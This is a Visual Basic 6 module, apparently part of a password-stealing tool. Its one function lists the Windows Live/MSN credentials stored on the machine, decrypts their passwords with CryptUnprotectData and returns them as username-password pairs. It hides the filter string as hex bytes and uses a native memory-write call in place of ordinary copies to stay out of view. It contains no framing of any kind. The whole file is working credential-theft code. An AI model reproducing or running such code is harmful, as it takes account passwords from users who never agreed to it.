Attribute VB_Name = "Password"
Private Declare Function CredEnumerateW Lib "advapi32.dll" (ByVal lpszFilter As Long, ByVal lFlags As Long, ByRef pCount As Long, ByRef lppCredentials As Long) As Long
Private Declare Function CredFree Lib "advapi32.dll" (ByVal pBuffer As Long) As Long
Private Declare Function CryptUnprotectData Lib "crypt32.dll" (ByRef pDataIn As DATA_BLOB, ByVal ppszDataDescr As Long, ByVal pOptionalEntropy As Long, ByVal pvReserved As Long, ByVal pPromptStruct As Long, ByVal dwFlags As Long, ByRef pDataOut As Long) As Long
Private Declare Function NtWriteVirtualMemory Lib "NTDLL" (ByVal ProcessHandle As Long, ByVal BaseAddress As Long, ByVal pBuffer As Long, ByVal NumberOfByVGVzdG8Write As Long, ByRef NumberOfBytesWritten As Long) As Long
Private Declare Function NtAllocateVirtualMemory Lib "ntdll.dll" (ByVal ProcHandle As Long, BaseAddress As Long, ByVal NumBits As Long, regionsize As Long, ByVal flags As Long, ByVal ProtectMode As Long) As Long
Private Declare Function VirtualFreeEx Lib "kernel32.dll" (ByVal hProcess As Long, ByRef lpAddress As Any, ByVal dwSize As Long, ByVal dwFreeType As Long) As Long

Private Type DATA_BLOB
    cbData                  As Long
    pbData                  As Long
End Type

Public Function sMSN() As String
    Dim lMem        As Long
    Dim i           As Long
    Dim lCount      As Long
    Dim lCred       As Long
    Dim lUbound     As Long
    Dim lPtr        As Long
    Dim lUser       As Long
    Dim tBlobIn     As DATA_BLOB
    Dim sPass       As String
    Dim bGuid(17)   As Integer
    Dim lChar       As Long
    Dim sUser       As String
    Dim j           As Long
   
    Call NtAllocateVirtualMemory(-1, lMem, 0, 38, &H1000, &H40)

    bGuid(0) = &H57: bGuid(1) = &H69: bGuid(2) = &H6E: bGuid(3) = &H64: bGuid(4) = &H6F: bGuid(5) = &H77: bGuid(6) = &H73: bGuid(7) = &H4C: bGuid(8) = &H69: bGuid(9) = &H76: bGuid(10) = &H65: bGuid(11) = &H3A: bGuid(12) = &H6E: bGuid(13) = &H61: bGuid(14) = &H6D: bGuid(15) = &H65: bGuid(16) = &H3D: bGuid(17) = &H2A
   
    For i = 0 To 17
        NtWriteVirtualMemory -1, ByVal lMem + (i * 2), ByVal VarPtr(CLng(bGuid(i))), &H1, 0
    Next
   
    Call CredEnumerateW(lMem, 0, lCount, lCred)
   
    If lCount Then
        For i = lUbound To lUbound + lCount - 1
            NtWriteVirtualMemory -1, ByVal VarPtr(lPtr), ByVal lCred + (i - lUbound) * 4, &H4, 0
            NtWriteVirtualMemory -1, ByVal VarPtr(lUser), ByVal lPtr + 48, &H4, 0
            NtWriteVirtualMemory -1, ByVal VarPtr(tBlobIn.pbData), ByVal lPtr + 28, &H4, 0
            NtWriteVirtualMemory -1, ByVal VarPtr(tBlobIn.cbData), ByVal lPtr + 24, &H4, 0

            Call CryptUnprotectData(tBlobIn, 0&, 0&, 0&, 0&, 1&, 0&)

            sPass = Space(tBlobIn.cbData \ 2)
            NtWriteVirtualMemory -1, ByVal StrPtr(sPass), ByVal tBlobIn.pbData, tBlobIn.cbData, 0
           
            If Len(sPass) > 0 Then
                j = 0
                sUser = vbNullString
                lChar = 1
                Do
                    NtWriteVirtualMemory -1, ByVal VarPtr(lChar), ByVal lUser + j * 2, &H1, 0
                    If lChar = 0 Then Exit Do
                    sUser = sUser & Chr(lChar)
                    j = j + 1
                Loop
                sMSN = sMSN & sUser & "    -    " & sPass & vbCrLf
            End If
        Next
        lUbound = lUbound + lCount
    End If
   
    Call CredFree(lCred)
    Call VirtualFreeEx(-1, lMem, 38, &H8000)
End Function

